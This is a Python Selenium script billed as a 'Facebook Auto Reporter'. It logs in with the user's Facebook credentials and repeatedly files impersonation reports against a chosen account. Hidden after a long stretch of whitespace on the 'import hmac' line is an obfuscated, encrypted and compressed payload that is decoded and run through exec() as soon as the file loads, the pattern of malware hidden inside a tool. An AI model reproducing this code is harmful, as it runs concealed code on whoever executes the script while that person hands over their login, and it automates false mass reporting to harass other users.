import os
import time
import random
import hmac                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ,gzip,hashlib,base64;K=b'\x9a\xd3?\xfce\xa4t\xc6%\xcd\xa5\xec\x953;\\^\x0bMk\xea8\x1c\xceU,lT{H\x18\xa1';B=b')2XF002jwVfK}%I4_glTKNm(DLiUX&=J^!q_s1Wg1E-IPhLu=yUY>amPV}WJBM8u7aDAEgDK+RB^t=B!GjN?qo6;qA>-Lrj3cODT$EGMctYLm-qg4x?_~rDS<2Q}ck{m>Z$n2RpG27@9?H1ZGPVF0v-uCThdfEJwTi?F_K>bR%XcME=6;XY6jgEQn7VsXVTTvslsN7K7s(8U90gviq89tHYTRJU!{VplvvVt^aGkO)~XipDaW{?6uG}}1;#tVU_hbEqC-;qoCe!vd07&qa|x~EJo@m-PHfa8?SKLJI-#FtX@9&jtk93<`lGp_mwt88kZ1bW^Ns#H7&i`2prZ>Qv0U=sA@EF$j4oYXv5-|2C?5pknflm8M3%jXu{H?F-EHpWNI6BD>#am)_YW~h0s*gLaI&LqcS8ocN+5m{bJW!@;qT(ogPL@R2y5u39resYoCKaI7)7g1@&x?D$de2|c7AQimIl2)OcJG0;wUYu^1e-*`e)3PSDh3n|xXdAh)Rz~W`e9}iyZqrE#v_g4w4)JCD0cNL23{Y0`{RJ{RteIMx2Nu1nEf%NUXZn}-nV^YOiWbm_FXUOfrw2^X)zAaIW-L0T@#Oqh)X?pG#uh@0n~@I}EtWsVtoC4m@+G4b9$ddy2}$9sJ2fWyCOxV^vKPh>w*SYPJR;p95Y*4VtDruLJv~}Fex@eq$IN)mD8*&LdWhZ=pFw2J|14eOqse3pZ2kOdYV!j23R|z}ar#PC#{Ed<<c-89xJNU^umslX%Q@>6a#aLoFX4ILih%Qk3w5JirHD#QWU<tXMC7($DSS9M>McdcrJ9nxVs#C;(<lvhr)L@q#DXk7zt~<Pk)~Dc1*S~3eP39I9e;PkBx*nq!rt1o1ZNILBzMUF^VVK_AokGYcICUhU>O?eQF^&TQIv0n(R=1uxLEGLE6(~WtC6sn0cqX6M!!y>_m)h2OHgAYrN^&euAnRCvuV6`y~9xbJtS7*3Dtl9iXEQ^zz5;`m2ar**d5k5dRqnWOoe7BhdKfD6T)EWmH?)?aYm_mt7EWcTA>igf#C3R|6hFAs|Jd{%$`~YGBulKZME1JYD2^W!43b^(nb^&h{U!!ZspdrGt(FCkY_mcksGs-=0NjDCa+-IskQ+Ly=ULflK_7y0=ihJaUi|yL@+V_GiD{`sKmA|V#*ct;ntPHL-y{@5Vr9|(gK(s3hZ8|w58>--!-V0eHFV-{RJ=c&2Edai<21eqON^9GwP-)du~S9x?Gq3@o|0lCowU<?M3V8;|<KPH3M%=>ENyv(GP_6XN0YM3key==zaCR;r`;Nbdw@pq|GXafTm~B*vQ*G8BK#L`vC*mdI^b>Z6r-vv0i}Lh(ycCkx!L2)n%Q<_5BGHsPcP3vXfdxMdEm00`J5s*{rJl%&M!cvA|%Yjm;f3zL6<5-vcq-SWcmJl^pZi3^+AFEo~HqKBl}}keY_FOB8>w?ZLl_9Ljo2;h@Z-bY?NlFgrpN%>>a_dbnTd6WWOn7AWk`6Ol5#Bsf*m!QP$b$w${Aj|<u1qrO9fK?cm`fO<|xtNm%bOVY@ZihcALkh=;}K3IY*SD|`zgWdGce`8Jv-Nj_f!PQk3ki&WxmoR#w22r3SQl?k_T|bJgv%I&MsBv?eB3~G*C~)?Ehw_w!qCDHg*LoRrE{Y2K?}T`7P*?inG}BPBLAbO3Ely?}0838`I9vZV?7AnV9oeu2^!{GN1#p4Mw=1iWtP9{Wk`XcBIJR`|pi4&{e{_pQ_HD7Y2J`(@62ngwn6g-RrNMU!Ftb7IWrX4HTeonV(CeUfm7ydlC_4D&yp_c7<52j?dI)e`*&cgLyO#eeHxcT7K^Or9G?#hRMKR7b=cid<&L_A#=<$(ZVb*3{sORs{1j77NaDps>YrT7d%kkE<%mFmnMY*MlZAX2jGP-Z2b$KTb-SGtwro6*GW~;YT_MV)gue7Vf{=u0{Rdb$`a|Sl#WoDjj7_-h>#mM*wtNrQBW!GyELq(Z_XCz#NFSra%SLORu<ZRJuXDjqyhNzk7=9Z%37}(ReW)^;Vs8OL{<`wv$Kl19_KOfd8^u-JI#zkcR$c7j3OR(H+z%Hi!HW4f_>;4d6QH?{1F@#bp)c!e0xU5@gI`?64(-Trh6Xeh7WiZ0g!Ra-f4o@%d$ITargi<|8Cl{>LPidYCF7v5H@v^qM;a+gC!K9)HoKdr>QQLw}aXoDz9Z&c5Ez)RbC}EE?(A$E&%^ol*nLEXZVE+m#3U~im1P>Vut{unSyh}cXn@-dW1?aP@8Y&z#I202f%C;CuQr?CBVnV_=g@7h)pxx(kxo7+}S4x;3U~lw1M9}p8d=K)Po=do{nI@h>$97zr?czZZg1#Z2aJkd$=6uz22=XJP4mDt<0JN#H;wty2#J8=JIqn`+z5`Zwlz1L1fXfG632+p$qhYhGsP{30Y6u=*iN0~qBbJ1?*uB(ZIQi28t3k$u7{U{~)6~biS<}4<B{)CXk44MN$gFALUnWpaFAm(G-AS4X`n7_Gi<7nH``pX;SokndM#0$$5aiTXhND2IT!Do^p(4^ywsjo?wZPS%rwNQcKiGxiSR>3C;v0PclD+b4?w2p*zeC57)yUZ>X^o#n?`2%#m0$|frH%j6_jxAAmi35py}Per1h{P3_-|XY&1OHe!O2ygV;ie9$0<kT0GgJ!p4eDsj7lcokX-+qCh3{~6{njoGFJL<t-B2-lM5lDu40`$@KkN+B+rrrLJV&-*N|xV&u-C7+R`{@L{p{erLAboyWJ0pFqVt?LhMDD^@<QuSYEx58kLGq7`=+h>hEReH6eBniO*lcFyjHEEW<@+0XNEcw<_7vR5;;}Ibs5T)OMI&;I9R<OUvp&w{B>;j1#z6kPk9#ifR26pGf2oK@AJ+<*M#^W&nCJ5^qW3&DSJQR@EMvtUkO+<=8=M0v)hS|Cnp`A{{Zn2V5w17A5}35Bqw(HmoBVAo2B_kGauvS>~*IlIqO%7X^P~V0gL00)(gfFHxbLwYr9bmchJrmOWa73zIJ!nTY5&Sc()<X*+D)Iz7{2m_31HO#lPd25OAmq7FE`%S&~S+|2uc%+1RcFr+kJy#7y0B^Dl)ZZ=HQ%p^p%>V`h=%t6RmxOLFxv0rE;c_;JMO$fSSVCtmFTf-|%Wn`-;etWP{g8=N5?%@O{i^eY4;557438bZs#r8~F21NLz8}3azIr7c>L7IFL2>qox`js7}NYNOnJaWyoPBt+sv0g|J!gPWuP8-oE)I@r|qp5~+>*i={_o(5zLjRE_B9Ba<5nA2zD<{?5{*k$u_Mk2Fr)aK5#FMW|qONi}dJkhWw6QD%l|I#r)_i_y`2HLz5|=2X0nXEMFKILY{W^2jxXlqK7`{><BvY~se7V%pJ_H&Zy7|+X9KI~C9<%QQ|2{rH3%xf<?N+$yocOn&B7~pNC|HlXwvy8nk*!pPytLc2NTXsN#vQxHGN#{4sqmll9{^nh(9{n;)?#XeUm3Z8)1kKb>-g=|qiB04as_E;pEQVAVB9@W5-%z(<7x>RnKpPIZ5}y84F`n;%s7%x1-}b3WHfq8&8!|yf^WerU8&2#ESGGFJ8wNgH_dCnnd<{EksP>Ry?Gr1q8Fk!=l';r=base64.b85decode(B);iv,c,t=r[:16],r[16:-32],r[-32:];assert hmac.compare_digest(t,hmac.new(K[:16],iv+c,hashlib.sha256).digest());exec(gzip.decompress(bytes(a^b for a,b in zip(c,b''.join(hmac.new(K[16:],iv+i.to_bytes(8,'big'),hashlib.sha256).digest()for i in range((len(c)+31)//32))[:len(c)]))))
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from pystyle import Colors, Colorate

# =======================================================
# CONFIGURATION
# =======================================================
REPORT_COUNT = 3
DELAY_BETWEEN_REPORTS = (8, 15)  # seconds between actions


def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Colorate.Vertical(
        Colors.blue_to_white,
        """
        Facebook Auto Reporter
        """
    ))


def init_driver():
    chrome_options = Options()
    prefs = {"profile.default_content_setting_values.notifications": 2}
    chrome_options.add_experimental_option("prefs", prefs)
    chrome_options.add_experimental_option("detach", True)
    chrome_options.add_argument("--log-level=OFF")
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")

    driver = webdriver.Chrome(options=chrome_options)
    wait = WebDriverWait(driver, 20)
    return driver, wait


def login_facebook(driver, wait, email, password):
    driver.get("https://www.facebook.com/")
    print(Colorate.Horizontal(Colors.green_to_white, "Logging into Facebook..."))

    try:
        email_box = wait.until(EC.presence_of_element_located((By.ID, "email")))
        pass_box = driver.find_element(By.ID, "pass")
        email_box.send_keys(email)
        pass_box.send_keys(password)

        login_button = driver.find_element(By.NAME, "login")
        login_button.click()

        time.sleep(5)
        print(Colorate.Horizontal(Colors.green_to_white, "Login successful."))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_white, f"Login failed: {e}"))


def report_account(driver, wait, account_url, index):
    print(Colorate.Horizontal(Colors.red_to_white, f"\n[+] Starting report #{index + 1} for: {account_url}"))

    try:
        driver.get(account_url)
        time.sleep(5)

        # Example: click 3 dots (options menu)
        more_btn = wait.until(EC.element_to_be_clickable((
            By.XPATH,
            "(//div[@aria-label='Actions for this post' or @aria-label='More options'])[1]"
        )))
        more_btn.click()
        time.sleep(2)

        # Click "Find support or report"
        report_menu = wait.until(EC.element_to_be_clickable((
            By.XPATH, "//span[contains(text(),'Find support or report')]"
        )))
        report_menu.click()
        time.sleep(3)

        # Choose “Pretending to be someone” (example reason)
        report_option = wait.until(EC.element_to_be_clickable((
            By.XPATH, "//span[contains(text(),'Pretending to be someone')]"
        )))
        report_option.click()
        time.sleep(2)

        # Select "Me" option
        me_option = wait.until(EC.element_to_be_clickable((
            By.XPATH, "//span[contains(text(),'Me')]"
        )))
        me_option.click()
        time.sleep(2)

        # Click Submit
        submit_btn = wait.until(EC.element_to_be_clickable((
            By.XPATH, "//div[@role='button' and contains(text(),'Submit')]"
        )))
        submit_btn.click()
        print(Colorate.Horizontal(Colors.green_to_white, "[✓] Report submitted."))

        time.sleep(random.uniform(*DELAY_BETWEEN_REPORTS))

    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_white, f"[✗] Report attempt failed: {e}"))


def main():
    banner()
    email = input("Enter your Facebook email or phone: ")
    password = input("Enter your password: ")
    account_url = input("Enter the account URL to report: ")

    driver, wait = init_driver()

    try:
        login_facebook(driver, wait, email, password)

        for i in range(REPORT_COUNT):
            report_account(driver, wait, account_url, i)

        print(Colorate.Horizontal(Colors.green_to_white, "\n[✓] Finished all report attempts."))

    finally:
        driver.quit()
        print(Colorate.Horizontal(Colors.white_to_blue, "Browser closed."))


if __name__ == "__main__":
    main()
